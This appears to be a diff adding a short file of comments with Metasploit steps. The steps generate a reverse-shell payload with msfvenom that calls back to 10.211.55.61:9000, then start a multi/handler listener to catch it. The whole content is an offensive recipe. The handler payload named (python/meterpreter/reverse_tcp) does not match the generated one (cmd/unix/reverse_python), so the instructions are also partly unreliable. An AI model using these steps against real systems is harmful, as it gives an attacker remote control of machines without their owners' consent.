@@ -1,0 +1,11 @@
+# Build shell:
+#
+#   msfvenom -p cmd/unix/reverse_python LHOST=10.211.55.61 LPORT=9000 -f raw > shell.py
+
+# In metasploit:
+#
+#   use exploit/multi/handler
+#   msf exploit(handler) > set payload python/meterpreter/reverse_tcp
+#   set LPORT 9000
+#   set LHOST 0.0.0.0
+#   exploit
